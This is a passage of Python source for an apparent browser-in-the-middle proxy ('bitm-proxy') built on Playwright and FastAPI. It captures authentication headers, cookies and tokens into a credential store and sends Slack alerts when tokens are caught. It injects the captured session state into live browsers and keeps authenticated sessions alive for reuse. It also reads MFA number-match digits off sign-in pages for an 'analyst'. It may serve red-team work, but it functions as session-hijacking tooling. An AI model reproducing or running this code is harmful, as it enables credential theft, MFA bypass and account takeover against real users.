"""Remote browser session — WebSocket + Playwright.

All debug goes to the shared log buffer (visible on :8092).
The main WS (8091) only gets screenshots, status, and captured_input messages.
"""

import asyncio
import base64
import json
import os
import sys
import time
import traceback
from pathlib import Path
from typing import Any, Optional
from urllib.parse import urlparse, parse_qs

from fastapi import (APIRouter, WebSocket, WebSocketDisconnect,
                      Query, UploadFile, File, Request)
from playwright.async_api import async_playwright

from backend.store import JsonStore
from backend.paths import screenshots_dir as _get_screenshots_dir, certs_dir as _get_certs_dir
from backend.shared import (
    append_log, get_config_value, update_config,
    register_session, unregister_session, update_session_info,
    notify_sites_changed,
    close_session_logger, update_current_jwts,
    append_flow, update_flow, find_flow_seq_by_req_id,
)
from backend.keepalive import (
    notify_slack_capture, notify_slack_login_start, notify_slack_token,
)
from backend.auth import verify_ws_key
from backend import subsessions as _subs
from backend import host_captures as _hosts
from backend import site_rules as _rules
from backend.auth_milestones import parse_ca_blocked_details

router = APIRouter()

credentials_store = JsonStore("credentials")
cookies_store = JsonStore("cookies")


# ── Session-scoped debug helpers (called from the :8092 dashboard) ────

async def debug_dump_dom(session_id: str) -> dict:
    """Write the current page's fully-rendered HTML to data/debug/<sid>-<ts>.html."""
    from backend.paths import data_dir
    page = _live_pages.get(session_id)
    if not page:
        return {"ok": False, "error": f"no live page for session {session_id}"}
    try:
        html = await page.content()
    except Exception as e:
        return {"ok": False, "error": f"page.content() failed: {e}"}
    d = data_dir() / "debug"
    d.mkdir(parents=True, exist_ok=True)
    path = d / f"{session_id}-{int(time.time())}.html"
    path.write_text(html, encoding="utf-8")
    return {"ok": True, "path": str(path), "bytes": len(html),
            "title": await _safe_title(page), "url": page.url}


async def _safe_title(page) -> str:
    try:
        return await page.title()
    except Exception:
        return ""


async def debug_list_frames(session_id: str) -> dict:
    """Enumerate every frame in the page tree + any forms/inputs inside each."""
    page = _live_pages.get(session_id)
    if not page:
        return {"ok": False, "error": f"no live page for session {session_id}"}
    frames = []
    for f in page.frames:
        info = {"url": f.url, "name": getattr(f, "name", "") or ""}
        try:
            info["forms"] = await f.eval_on_selector_all(
                "form",
                "fs => fs.map(fm => ({"
                "action: fm.action || '', method: (fm.method||'get'),"
                "inputs: Array.from(fm.querySelectorAll('input,select,textarea,button'))"
                "  .map(e => ({tag: e.tagName.toLowerCase(), type: (e.type||''),"
                "              name: (e.name||''), id: (e.id||''),"
                "              placeholder: (e.placeholder||'')}))"
                "}))",
            )
        except Exception as e:
            info["forms"] = []
            info["forms_error"] = str(e)[:200]
        try:
            info["buttons"] = await f.eval_on_selector_all(
                "button, [role='button'], [data-value]",
                "bs => bs.slice(0, 40).map(b => ({"
                "tag: b.tagName.toLowerCase(), id: (b.id||''),"
                "data_value: (b.getAttribute('data-value')||''),"
                "text: (b.innerText||'').trim().slice(0, 80)}))",
            )
        except Exception:
            info["buttons"] = []
        frames.append(info)
    return {"ok": True, "frames": frames, "count": len(frames),
            "url": page.url, "title": await _safe_title(page)}


def _pick_engine_for(login_url: str, sid: str) -> tuple[str, str | None]:
    """Pick Playwright engine_family + channel based on the captured
    User-Agent for the target host. When the feature is off or no UA
    was captured, returns ("chromium", None) so the existing launch
    path applies unchanged."""
    if not get_config_value("use_captured_fingerprint", False):
        return ("chromium", None)
    if not get_config_value("fingerprint_match_engine", True):
        return ("chromium", None)
    try:
        from backend.auth_proxy import get_captured_fingerprint
        from backend.ua_engine import ua_to_playwright_engine
        host = urlparse(login_url).hostname or ""
        fp = get_captured_fingerprint(host) or {}
        ua = next((v for k, v in fp.items() if k.lower() == "user-agent"),
                  "")
        if not ua:
            return ("chromium", None)
        family, channel = ua_to_playwright_engine(ua)
        if family != "chromium":
            _log(f"FINGERPRINT engine match host={host} ua={ua[:70]} "
                 f"engine={family}", session_id=sid)
        elif channel:
            _log(f"FINGERPRINT engine match host={host} ua={ua[:70]} "
                 f"engine=chromium channel={channel}", session_id=sid)
        return (family, channel)
    except Exception as e:
        _log(f"FINGERPRINT engine pick failed: {e}",
             session_id=sid, level="warn")
        return ("chromium", None)


async def _engine_launch(pw, family: str, launch_opts: dict,
                           channel: str | None, sid: str):
    """Launch the correct Playwright engine. `family` ∈ {"chromium",
    "firefox","webkit"}. When family is chromium and a channel is
    provided (e.g. "msedge"), honour it; otherwise ignore channel."""
    opts = dict(launch_opts)
    if family == "chromium":
        if channel:
            opts["channel"] = channel
        return await pw.chromium.launch(**opts)
    # Firefox + WebKit don't take `channel` or chromium CLI flags.
    opts.pop("channel", None)
    engine = getattr(pw, family)
    return await engine.launch(**opts)


async def debug_export_flow(session_id: str, fmt: str = "json") -> dict:
    """Dump the current session's flow_entries to data/debug/.

    fmt='json' writes the raw internal record (full req+resp, headers, bodies).
    fmt='har'  writes a HAR 1.2 file Burp Suite / browser devtools can import.
    """
    from backend.paths import data_dir
    from backend.shared import get_flow
    entries = get_flow(session_id) or []
    if not entries:
        return {"ok": False, "error": f"no flow for session {session_id}"}
    fmt = (fmt or "json").lower()
    if fmt not in ("json", "har"):
        return {"ok": False, "error": f"unknown format {fmt!r} (json|har)"}
    d = data_dir() / "debug"
    d.mkdir(parents=True, exist_ok=True)
    ts = int(time.time())
    import json
    if fmt == "har":
        path = d / f"{session_id}-flow-{ts}.har"
        path.write_text(json.dumps(_entries_to_har(entries, session_id),
                                   default=str, indent=2),
                        encoding="utf-8")
    else:
        path = d / f"{session_id}-flow-{ts}.json"
        path.write_text(json.dumps(entries, default=str, indent=2),
                        encoding="utf-8")
    return {"ok": True, "path": str(path), "format": fmt,
            "entries": len(entries), "bytes": path.stat().st_size}


@router.get("/session/{session_id}/flow-export")
async def flow_export_download(session_id: str, format: str = "json"):
    """Stream the session's flow as JSON or HAR with an
    `attachment` Content-Disposition so the browser saves it directly
    instead of rendering inline. Replaces the dashboard's old
    Export-Flow path that wrote a file under `$DATA_DIR/debug/` (which
    still works via the `debug_export_flow` WS command for headless /
    automation callers — that path is untouched).

    Auth: standard middleware accepts either `Authorization: Bearer
    <key>` or `?api_key=<key>` query param, so a plain `<a download>`
    click from the dashboard works without any header gymnastics."""
    from fastapi import HTTPException
    from fastapi.responses import Response
    from backend.shared import get_flow
    import json as _json
    entries = get_flow(session_id) or []
    if not entries:
        raise HTTPException(status_code=404,
                            detail=f"no flow for session {session_id!r}")
    fmt = (format or "json").lower()
    if fmt == "har":
        body = _json.dumps(_entries_to_har(entries, session_id),
                            default=str, indent=2)
        ext = "har"
    elif fmt == "json":
        body = _json.dumps(entries, default=str, indent=2)
        ext = "json"
    else:
        raise HTTPException(status_code=400,
                            detail=f"unknown format {format!r} (json|har)")
    safe_sid = "".join(c if c.isalnum() or c in "-_." else "_"
                        for c in session_id)[:80]
    filename = f"{safe_sid}-flow-{int(time.time())}.{ext}"
    return Response(
        content=body,
        media_type="application/json",
        headers={
            "Content-Disposition": f'attachment; filename="{filename}"',
            # Discourage caching — flows mutate during a session.
            "Cache-Control": "no-store",
        },
    )


def _entries_to_har(entries: list, session_id: str) -> dict:
    """Render flow entries as a HAR 1.2 document. Burp Suite's 'Import HAR'
    reads this directly; it also loads in Chrome/Firefox devtools."""
    from datetime import datetime, timezone
    from urllib.parse import urlparse, parse_qsl
    har_entries = []
    for e in entries:
        ts_req = e.get("ts_req") or 0
        ts_resp = e.get("ts_resp") or ts_req
        started = datetime.fromtimestamp(ts_req or 0,
                                          tz=timezone.utc).isoformat()
        total_ms = int(((ts_resp or ts_req) - (ts_req or 0)) * 1000)
        req_headers = [{"name": k, "value": str(v)}
                       for k, v in (e.get("request_headers") or {}).items()]
        resp_headers = [{"name": k, "value": str(v)}
                        for k, v in (e.get("response_headers") or {}).items()]
        url = e.get("url") or ""
        try:
            qs = [{"name": k, "value": v}
                  for k, v in parse_qsl(urlparse(url).query, keep_blank_values=True)]
        except Exception:
            qs = []
        resp_body = e.get("response_body") or ""
        resp_ct = ""
        for h in resp_headers:
            if h["name"].lower() == "content-type":
                resp_ct = h["value"]; break
        req_body = e.get("request_body") or ""
        post_data = None
        if req_body:
            req_ct = ""
            for h in req_headers:
                if h["name"].lower() == "content-type":
                    req_ct = h["value"]; break
            post_data = {"mimeType": req_ct or "application/octet-stream",
                         "text": req_body}
        har_entries.append({
            "startedDateTime": started,
            "time": total_ms,
            "request": {
                "method": e.get("method") or "GET",
                "url": url,
                "httpVersion": "HTTP/1.1",
                "cookies": [],
                "headers": req_headers,
                "queryString": qs,
                "headersSize": -1,
                "bodySize": len(req_body.encode("utf-8", "ignore"))
                            if req_body else -1,
                **({"postData": post_data} if post_data else {}),
            },
            "response": {
                "status": e.get("status") or 0,
                "statusText": "",
                "httpVersion": "HTTP/1.1",
                "cookies": [],
                "headers": resp_headers,
                "content": {
                    "size": len(resp_body.encode("utf-8", "ignore"))
                            if resp_body else 0,
                    "mimeType": resp_ct or "application/octet-stream",
                    **({"text": resp_body} if resp_body else {}),
                },
                "redirectURL": "",
                "headersSize": -1,
                "bodySize": len(resp_body.encode("utf-8", "ignore"))
                            if resp_body else -1,
            },
            "cache": {},
            "timings": {"send": 0, "wait": total_ms, "receive": 0},
            "_seq": e.get("seq"),
            **({"_flag_error": e.get("flag_error")}
               if e.get("flag_error") else {}),
        })
    return {
        "log": {
            "version": "1.2",
            "creator": {"name": "bitm-proxy", "version": "1.0"},
            "browser": {"name": "Playwright", "version": "—"},
            "pages": [],
            "entries": har_entries,
            "_session_id": session_id,
        }
    }

# Per-session dedupe for Slack notifications — key is sid, value is a set
# of "event-tokens" already sent (hostname for login_start, header-name for
# token capture). Prevents Slack spam on noisy redirect flows.
_slack_sent: dict[str, set[str]] = {}


def _slack_once(sid: str, key: str) -> bool:
    """Return True if this (sid, key) hasn't been signalled yet."""
    sent = _slack_sent.setdefault(sid, set())
    if key in sent:
        return False
    sent.add(key)
    return True

# Registry of live Playwright pages keyed by session_id, populated by the
# active WebSocket handler below. Used by hydrate_session() to inject
# proxy-captured state into the running browser without a restart.
_live_pages: dict[str, object] = {}

# Sessions kept alive past their WebSocket lifetime — populated when the
# post_login_redirect fires. Holds strong refs to the Playwright instance
# and Browser so they aren't garbage-collected after the WS handler exits.
# The Page stays in `_live_pages` so `_fetch_via_playwright` (auth proxy)
# continues to route authenticated requests through this context.
_kept_alive: dict[str, dict] = {}


async def hydrate_session(session_id: str, hostname: str,
                          navigate: bool = True) -> dict:
    """Inject state captured by the :3128 proxy into a running Playwright
    session on :8091 — no restart. Returns a result dict."""
    _log(f"HYDRATE_START session={session_id} host={hostname} navigate={navigate}",
         session_id=session_id)
    page = _live_pages.get(session_id)
    if page is None:
        _log(f"HYDRATE_FAIL no live session {session_id}  known: {list(_live_pages.keys())}",
             session_id=session_id, level="warn")
        return {"ok": False, "error": f"no live session {session_id}"}
    from backend.auth_proxy import get_captured_session_state
    state = get_captured_session_state(hostname)
    if not state:
        _log(f"HYDRATE_FAIL no captured state for {hostname}",
             session_id=session_id, level="warn")
        return {"ok": False,
                "error": f"no captured state for {hostname} (browse through :3128 first)"}
    cookies = state.get("cookies") or []
    _log(f"HYDRATE_PLAN cookies={len(cookies)} names=[{', '.join(c['name'] for c in cookies[:15])}"
         f"{'...' if len(cookies) > 15 else ''}]",
         session_id=session_id)
    added = 0
    if cookies:
        try:
            await page.context.add_cookies(cookies)
            added = len(cookies)
            _log(f"HYDRATE_COOKIES_OK added={added}", session_id=session_id)
        except Exception as e:
            _log(f"HYDRATE_COOKIES_FAIL {e}", session_id=session_id, level="warn")
            return {"ok": False, "error": f"add_cookies failed: {e}",
                    "cookies_attempted": len(cookies)}
    extras = state.get("headers") or {}
    if extras:
        try:
            existing = await page.context.extra_http_headers() if hasattr(
                page.context, "extra_http_headers") else {}
        except Exception:
            existing = {}
        merged = {**(existing or {}), **extras}
        try:
            await page.context.set_extra_http_headers(merged)
            _log(f"HYDRATE_HEADERS_OK names=[{', '.join(extras.keys())}]",
                 session_id=session_id)
        except Exception as e:
            _log(f"HYDRATE_HEADERS_FAIL {e}", session_id=session_id, level="warn")
    navigated_to = None
    if navigate and state.get("last_url"):
        _log(f"HYDRATE_NAVIGATE -> {state['last_url']}", session_id=session_id)
        try:
            await page.goto(state["last_url"], wait_until="commit", timeout=15000)
            navigated_to = state["last_url"]
            _log(f"HYDRATE_NAVIGATE_OK now={page.url}", session_id=session_id)
        except Exception as e:
            _log(f"HYDRATE_NAVIGATE_FAIL {e}", session_id=session_id, level="warn")
    _log(f"HYDRATE_DONE host={hostname} cookies={added} headers={len(extras)} "
         f"navigated_to={navigated_to}",
         session_id=session_id)
    return {"ok": True, "cookies_added": added, "headers_added": len(extras),
            "navigated_to": navigated_to, "hostname": hostname}


def _log(msg: str, category: str = "browser", session_id: str = "",
         level: str = "info"):
    """Print to stdout + push to shared log buffer."""
    ts = time.strftime("%H:%M:%S")
    if level != "debug":
        print(f"[BROWSER {ts}] {msg}", file=sys.stdout, flush=True)
    append_log(level, category, msg, session_id=session_id)


# ── Auth header detection (all data sourced from config/sites.yaml) ──
# See backend/site_rules.py — hot-reloaded from sites.yaml.


def _is_mcas_url(url: str) -> bool:
    """Check if URL is a Microsoft Cloud App Security proxy domain."""
    lower = url.lower()
    return any(d in lower for d in _rules.mcas_domains())


def _is_mcas_noise(url: str) -> bool:
    """Check if this is an MCAS CDN/i18n URL whose content should be ignored."""
    lower = url.lower()
    return any(d in lower for d in _rules.mcas_noise_domains())


def _is_login_url(url: str) -> bool:
    """Check if the current URL is a login/identity-provider page."""
    lower = url.lower()
    return any(p in lower for p in _rules.login_url_patterns())


def _is_auth_complete_url(url: str) -> bool:
    """Check if the current URL indicates successful authentication."""
    lower = url.lower()
    if any(p in lower for p in _rules.login_url_patterns()):
        return False
    return any(p in lower for p in _rules.auth_complete_url_patterns())


# ── Challenge classifier (rules sourced from sites.yaml) ───────────────
# All detection data lives in config/sites.yaml (overridable by
# $DATA_DIR/sites.yaml). Adding a new site is a YAML edit; no code change.

async def _classify_challenge(page) -> dict | None:
    """Return a dict describing the current auth challenge, or None."""
    try:
        url = (page.url or "")
    except Exception:
        return None
    if not url or url == "about:blank":
        return None
    url_low = url.lower()

    try:
        host = urlparse(url).hostname or ""
    except Exception:
        host = ""
    cfg = _rules.classify_rules(host)
    idp = cfg.get("idp") or ""
    err_rx = _rules.compile_regex(cfg.get("error_regex") or r"AADSTS\d{4,6}")
    err_codes = cfg.get("error_codes") or _rules.all_error_codes()

    # 1. Error code in URL fragment → authoritative
    frag = url_low.split("#", 1)[1] if "#" in url_low else ""
    if frag:
        m = err_rx.search(frag)
        if m:
            code = m.group(0)
            return {"kind": "error", "aadsts": code,
                    "meaning": err_codes.get(code, ""),
                    "idp": idp or "microsoft"}

    # 2. URL substring rules
    for rule in cfg.get("url_rules") or []:
        needle = (rule.get("match") or "").lower()
        if needle and needle in url_low:
            result = {"kind": rule.get("kind", "unknown"), "idp": idp}
            # CA-block redirects carry the policy/reason/correlation in
            # query params — surface them so the operator doesn't have
            # to eyeball the URL.
            if result["kind"] == "ca_blocked":
                details = parse_ca_blocked_details(url)
                if details:
                    result["details"] = details
            return result

    # 3. URL regex rules
    for rule in cfg.get("url_regex") or []:
        pat = rule.get("match_re") or ""
        if pat and _rules.compile_regex(pat).search(url_low):
            return {"kind": rule.get("kind", "unknown"), "idp": idp}

    # 4. DOM selectors (only evaluated when host matches a site)
    if idp:
        try:
            for rule in cfg.get("dom_rules") or []:
                sel = rule.get("selector")
                if not sel:
                    continue
                if await page.query_selector(sel):
                    kind = rule.get("kind", "unknown")
                    result = {"kind": kind, "idp": idp}
                    # Microsoft "approve sign-in" number-match: grab the
                    # displayed digits so the analyst knows which number to
                    # tap in the authenticator app.
                    if kind == "mfa_app_number_match":
                        try:
                            n = await page.eval_on_selector(
                                "#idRichContext_DisplaySign, [id*='DisplaySign']",
                                "e => (e.innerText || e.textContent || '').trim()")
                            if n:
                                result["number"] = n[:16]
                        except Exception:
                            pass
                    return result
        except Exception:
            pass

    # 4b. Unknown but looks like an IdP page — dump what we found so the
    # analyst (or a future sites.yaml edit) knows which selectors to add.
    # Only auto-describe when the URL at least contains "login" or "signin".
    if not idp and ("login" in url_low or "signin" in url_low or "/mfa" in url_low or "/oauth" in url_low):
        try:
            desc = await page.evaluate(
                "() => {"
                "  const grab = (sel, n) => Array.from(document.querySelectorAll(sel))"
                "    .slice(0, n).map(e => ({"
                "      id: (e.id||''), name: (e.name||''), type: (e.type||''),"
                "      data_value: (e.getAttribute && e.getAttribute('data-value'))||'',"
                "      text: (e.innerText||e.textContent||'').trim().slice(0, 60)}));"
                "  return {inputs: grab('input', 20),"
                "          buttons: grab('button, [role=\"button\"]', 20),"
                "          dataValues: grab('[data-value]', 20),"
                "          title: document.title};"
                "}")
            return {"kind": "unknown_login_page", "idp": "",
                    "describe": desc}
        except Exception:
            pass

    # 5. Error code embedded in page body
    try:
        text = (await page.content())[:200_000]
        m = err_rx.search(text)
        if m:
            code = m.group(0)
            return {"kind": "error", "aadsts": code,
                    "meaning": err_codes.get(code, ""),
                    "idp": idp or "microsoft"}
    except Exception:
        pass

    return None


def _is_app_install_url(url: str) -> bool:
    """Check if URL is trying to install/launch a native app."""
    lower = url.lower()
    if "oauth2" in lower and "authorize" in lower:
        return False
    return any(p in lower for p in _rules.app_install_url_patterns())


def _is_dead_end_url(url: str) -> bool:
    """Check if URL is a dead-end (404, chrome error, broken MCAS redirect)."""
    lower = url.lower()
    return any(p in lower for p in _rules.dead_end_url_patterns())


def _should_capture_header(name: str) -> bool:
    lower = name.lower()
    if lower in _rules.capture_header_names():
        return True
    return any(kw in lower for kw in _rules.capture_header_keywords())


async def _store_captured_header(site_id: str, name: str, value: str, source: str, sid: str):
    """Persist a captured header value to the credentials store."""
    def _merge(existing):
        if "captured_headers" not in existing:
            existing["captured_headers"] = {}
        existing["captured_headers"][name] = {
            "value": value,
            "source": source,
            "captured_at": time.time(),
        }
        return existing

    await credentials_store.update(
        site_id, _merge, default={"tokens": [], "cookies": []})
    notify_sites_changed()
    _log(f"HEADER CAPTURED {name}=<redacted ({len(value)} chars)> from {source[:150]}",
         category="capture", session_id=sid)

    # Sub-session log — raw value is NOT stored here, only name/source/length.
    try:
        _subs.record_event(sid, "auth_header",
                           name=name, source=source[:200],
                           value_len=len(value))
    except Exception:
        pass
    # Host-keyed capture store — same sanitised payload, indexed by the
    # hostname the header was seen on, so we can review per site.
    try:
        host = urlparse(source).hostname or ""
        if host:
            # Figure out the latest known user_id for this session.
            user_hint = ""
            try:
                from backend.shared import get_active_sessions
                user_hint = (get_active_sessions().get(sid) or {}).get("user_id", "") or ""
            except Exception:
                pass
            _hosts.record_event(host, "auth_header", sid=sid, user_id=user_hint,
                                name=name, value_len=len(value),
                                source=source[:200])
    except Exception:
        pass

    # Slack: first time this header name is captured in this session.
    if _slack_once(sid, f"token:{name}"):
        hostname = urlparse(source).hostname or site_id
        _fire_and_forget(notify_slack_token(
            site_id, hostname, name, len(value)))


def _is_auth_header(name: str) -> bool:
    lower = name.lower()
    if lower in _rules.ignore_headers():
        return False
    if lower in _rules.auth_headers():
        return True
    return any(kw in lower for kw in _rules.session_keywords())


def _redact(value: str, max_len: int = 300) -> str:
    if len(value) <= max_len:
        return value
    return value[:max_len] + f"...({len(value)} chars)"


def _is_noisy_url(url: str) -> bool:
    """Check if a URL should be filtered from logging. Matches on either a
    noisy file extension (config: noisy_extensions) OR a noisy host
    (config/sites.yaml globals.noisy_hosts — telemetry / analytics beacons
    that clutter logs without carrying auth state)."""
    if not get_config_value("filter_noisy_requests", True):
        return False
    lower = url.lower()
    path = lower.split("?", 1)[0].split("#", 1)[0]
    exts = get_config_value("noisy_extensions", [])
    if any(path.endswith(ext) for ext in exts):
        return True
    try:
        host = urlparse(url).hostname or ""
    except Exception:
        host = ""
    if host:
        host = host.lower()
        for noisy in _rules.noisy_hosts():
            if noisy.startswith("*."):
                if host == noisy[2:] or host.endswith("." + noisy[2:]):
                    return True
            elif noisy and noisy in host:
                return True
    return False


def _fire_and_forget(coro):
    task = asyncio.ensure_future(coro)
    def _done(t):
        if t.cancelled():
            return
        exc = t.exception()
        if exc is None:
            return
        # Suppress the very common "response body was discarded by chrome
        # before we could read it" race — happens naturally on fast redirects.
        msg = str(exc)
        if "Network.getResponseBody" in msg or "No resource with given identifier" in msg:
            return
        _log(f"async error: {exc}")
    task.add_done_callback(_done)
    return task


MAX_FLOW_BODY = 64 * 1024  # 64KB cap per body
_FLOW_BODY_TYPES = ("text/", "application/json", "application/xml",
                    "application/x-www-form-urlencoded", "application/javascript",
                    "application/graphql", "application/problem+json")
_FLOW_SKIP_RESOURCE_TYPES = {"image", "font", "media", "stylesheet"}


def _flow_should_capture_response_body(content_type: str, resource_type: str) -> bool:
    if resource_type in _FLOW_SKIP_RESOURCE_TYPES:
        return False
    if not content_type:
        return True  # capture unknown; truncated by size anyway
    ct = content_type.lower()
    return any(ct.startswith(t) for t in _FLOW_BODY_TYPES)


def _flow_trim_body(data: bytes | str) -> tuple[str, bool]:
    """Truncate a body to MAX_FLOW_BODY. Returns (text, truncated)."""
    if isinstance(data, bytes):
        truncated = len(data) > MAX_FLOW_BODY
        if truncated:
            data = data[:MAX_FLOW_BODY]
        try:
            text = data.decode("utf-8", errors="replace")
        except Exception:
            text = repr(data)
    else:
        truncated = len(data) > MAX_FLOW_BODY
        text = data[:MAX_FLOW_BODY] if truncated else data
    return text, truncated


async def _on_flow_request(request, sid: str):
    """Append a flow entry with request details."""
    try:
        url = request.url
        if _is_noisy_url(url):
            return
        body = None
        try:
            body = request.post_data
        except Exception:
            body = None
        body_text: str | None = None
        body_truncated = False
        if body:
            body_text, body_truncated = _flow_trim_body(body)
        redirected_from_seq = None
        try:
            rf = request.redirected_from
            if rf is not None:
                from backend.shared import find_flow_seq_by_req_id
                redirected_from_seq = find_flow_seq_by_req_id(sid, str(id(rf)))
        except Exception:
            pass
        entry = {
            "req_id": str(id(request)),
            "ts_req": time.time(),
            "ts_resp": None,
            "method": request.method,
            "url": url,
            "resource_type": getattr(request, "resource_type", "") or "",
            "redirected_from_seq": redirected_from_seq,
            "request_headers": dict(request.headers or {}),
            "request_body": body_text,
            "request_body_truncated": body_truncated,
            "status": None,
            "response_headers": None,
            "response_body": None,
            "response_body_truncated": False,
        }
        # Request-side milestone pass — catches AUTH CODE redirects the
        # RP receives back (GET ?code=…) and LOGIN-body markers in
        # POSTs even before the response arrives. _on_flow_response
        # re-runs classify with the response data and overwrites this
        # field if it finds a stronger match.
        try:
            from backend import auth_milestones as _am
            tags = _am.classify(entry)
            if tags:
                entry["auth_milestones"] = tags
        except Exception as _ame:
            _log(f"MILESTONE classify (request) failed: {_ame}",
                 session_id=sid, level="warn")
        append_flow(sid, entry)
    except Exception as e:
        seq = find_flow_seq_by_req_id(sid, str(id(request)))
        tag = f"#{seq} " if seq is not None else ""
        _log(f"{tag}flow request error: {e}", session_id=sid, level="debug")


async def _on_flow_response(response, sid: str):
    """Update the matching flow entry with response details."""
    try:
        url = response.url
        request = response.request
        req_id = str(id(request))
        status = response.status or 0
        is_error = 400 <= status < 600
        # Noisy URLs (telemetry, analytics, CDN beacons) are normally skipped.
        # But if the response is a 4xx/5xx we want the row in Flow Trace so
        # the analyst can click through from the flag banner.
        if _is_noisy_url(url) and not is_error:
            return
        headers = dict(response.headers or {})
        content_type = headers.get("content-type", "")
        resource_type = getattr(request, "resource_type", "") or ""
        body_text: str | None = None
        body_truncated = False
        # Always try to capture the body for error responses — error bodies
        # are often the most useful thing in a failing flow, and the scanner
        # can't extract a code without one.
        if is_error or _flow_should_capture_response_body(content_type, resource_type):
            try:
                raw = await asyncio.wait_for(response.body(), timeout=3.0)
                body_text, body_truncated = _flow_trim_body(raw)
            except Exception:
                pass
        # If this URL was filtered at the request side (noisy), there's no
        # flow entry yet. Create one now with the request info we have so
        # the transaction appears in Flow Trace.
        if is_error and find_flow_seq_by_req_id(sid, req_id) is None:
            try:
                req_headers = dict(request.headers or {})
            except Exception:
                req_headers = {}
            append_flow(sid, {
                "req_id": req_id,
                "ts_req": time.time(),
                "ts_resp": None,
                "method": request.method,
                "url": url,
                "resource_type": resource_type,
                "redirected_from_seq": None,
                "request_headers": req_headers,
                "request_body": None,
                "request_body_truncated": False,
                "status": None,
                "response_headers": None,
                "response_body": None,
                "response_body_truncated": False,
                "noisy_retroactive": True,
            })
        patch = {
            "ts_resp": time.time(),
            "status": response.status,
            "response_headers": headers,
            "response_body": body_text,
            "response_body_truncated": body_truncated,
        }
        # Auth-flow milestone classification — banners the key login →
        # code → tokens → session steps in the Flow Trace UI. We need
        # the original request data plus the response we just captured;
        # synthesise a candidate entry for the classifier rather than
        # racing the in-flight buffer.
        try:
            from backend import auth_milestones as _am
            from backend.shared import get_flow as _gf
            req_part = {}
            for fe in _gf(sid):
                if fe.get("req_id") == req_id:
                    req_part = {
                        "url": fe.get("url"),
                        "method": fe.get("method"),
                        "request_headers": fe.get("request_headers"),
                        "request_body": fe.get("request_body"),
                    }
                    break
            candidate = {**req_part, **patch}
            tags = _am.classify(candidate)
            if tags:
                patch["auth_milestones"] = tags
                _log("MILESTONE seq=" + str(find_flow_seq_by_req_id(sid, req_id))
                     + " tags=" + ",".join(t["label"] for t in tags),
                     session_id=sid)
        except Exception as _ame:
            _log(f"MILESTONE classify failed: {_ame}",
                 session_id=sid, level="warn")
        update_flow(sid, req_id, patch)
        # Scan the body for structured error codes per sites.yaml.
        if body_text:
            _scan_response_for_errors(
                sid, url, response.status, body_text, req_id=req_id)
    except Exception as e:
        try:
            seq = find_flow_seq_by_req_id(sid, str(id(response.request)))
        except Exception:
            seq = None
        tag = f"#{seq} " if seq is not None else ""
        _log(f"{tag}flow response error: {e}", session_id=sid, level="debug")


def _json_dig(obj: Any, path: str) -> Any:
    """Walk a dotted / bracketed JSON path. Returns None if any step misses."""
    if not path or obj is None:
        return None
    cur: Any = obj
    for part in path.split("."):
        if part.endswith("]") and "[" in part:
            base, idx = part.split("[", 1)
            idx = idx.rstrip("]")
            if base:
                if not isinstance(cur, dict):
                    return None
                cur = cur.get(base)
            if cur is None:
                return None
            try:
                cur = cur[int(idx)]
            except (ValueError, IndexError, TypeError):
                return None
        else:
            if isinstance(cur, dict):
                cur = cur.get(part)
            else:
                return None
    return cur


def _scan_response_for_errors(sid: str, url: str, status: int,
                                body: str, req_id: str = "") -> None:
    """Run the per-host response_errors rules against a response body. If any
    match, emit a CHALLENGE kind=error log + push a `flagged_error` WS event
    that carries the flow seq so the dashboard banner can jump to the exact
    transaction in Flow Trace."""
    import json as _json
    try:
        host = urlparse(url).hostname or ""
    except Exception:
        host = ""
    rules, codes, idp = _rules.response_error_rules_for(host)
    if not rules:
        return
    # Only try to parse as JSON — structured errors live there. Cheap guard.
    stripped = body.lstrip()
    if not (stripped.startswith("{") or stripped.startswith("[")):
        return
    try:
        payload = _json.loads(body[:200_000])
    except Exception:
        return
    # Resolve the Flow Trace seq for this response, if we have the req_id.
    seq = find_flow_seq_by_req_id(sid, req_id) if req_id else None
    seq_tag = f"#{seq} " if seq is not None else ""
    url_low = url.lower()
    for rule in rules:
        um = (rule.get("url_match") or "").lower()
        if um and um not in url_low:
            continue
        code = _json_dig(payload, rule.get("code_path", ""))
        if code is None or code == "" or code == 0:
            continue
        code_s = str(code)
        msg = _json_dig(payload, rule.get("message_path", "")) or ""
        meaning = codes.get(code_s) or ""
        summary = f"{code_s}"
        if meaning:
            summary += f" ({meaning})"
        if msg and msg != meaning:
            summary += f" — {msg[:160]}"
        _log(f"{seq_tag}CHALLENGE error idp={idp or 'unknown'} code={code_s} "
             f"host={host} status={status} {summary}",
             category="challenge", session_id=sid, level="warn")
        # Stamp the error onto the flow entry itself so the dashboard can
        # render a flag badge on the row and a red banner in the detail pane
        # without needing a parallel store. update_flow emits a flow_update
        # WS event that the dashboard already applies.
        if req_id:
            try:
                update_flow(sid, req_id, {
                    "flag_error": {
                        "code": code_s,
                        "message": str(msg)[:300],
                        "meaning": meaning,
                        "idp": idp,
                    },
                })
            except Exception:
                pass
        # Push a flagged_error event so the dashboard can raise a banner.
        try:
            from backend.shared import _push
            _push({"type": "flagged_error",
                   "session_id": sid, "idp": idp,
                   "host": host, "status": status,
                   "code": code_s, "message": str(msg)[:300],
                   "meaning": meaning,
                   "seq": seq, "url": url,
                   "ts": time.time()})
        except Exception:
            pass
        return  # One error per response is enough.


def _trace_active_for(sid: str) -> bool:
    """True when this session opted into Flow Trace (`?trace=true`
    on :8091 OR global `flow_trace_enabled` config). Decides whether
    diagnostic REQ/RESP lines fire — the credential-capture work
    itself runs unconditionally."""
    try:
        from backend.shared import _active_sessions
        if (_active_sessions.get(sid) or {}).get("trace"):
            return True
    except Exception:
        pass
    return bool(get_config_value("flow_trace_enabled", False))


async def _on_request_auth(request, site_id: str, sid: str):
    """Log request with auth headers to shared buffer."""
    try:
        url = request.url
        method = request.method
        headers = request.headers
        verbose = get_config_value("verbose", True)
        noisy = _is_noisy_url(url)
        trace_on = _trace_active_for(sid)

        # Look up the flow seq we just assigned in _on_flow_request so the
        # log line aligns with the Flow Trace timeline.
        seq = find_flow_seq_by_req_id(sid, str(id(request)))
        seq_tag = f"#{seq} " if seq is not None else ""

        # Per-request URL log lines are diagnostic noise — only emit
        # when trace is on. Auth-header capture below is the real
        # work and runs unconditionally.
        if trace_on and not noisy:
            if verbose:
                hdrs = dict(list(headers.items())[:12])
                _log(f"{seq_tag}REQ {method} {url[:300]}  headers={hdrs}", session_id=sid)
            else:
                _log(f"{seq_tag}REQ {method} {url[:300]}", session_id=sid)

        auth_found = {k: v for k, v in headers.items() if _is_auth_header(k)}
        if auth_found:
            for name, value in auth_found.items():
                _log(f"  {seq_tag}>>> REQ_AUTH {name}: <redacted ({len(value)} chars)>",
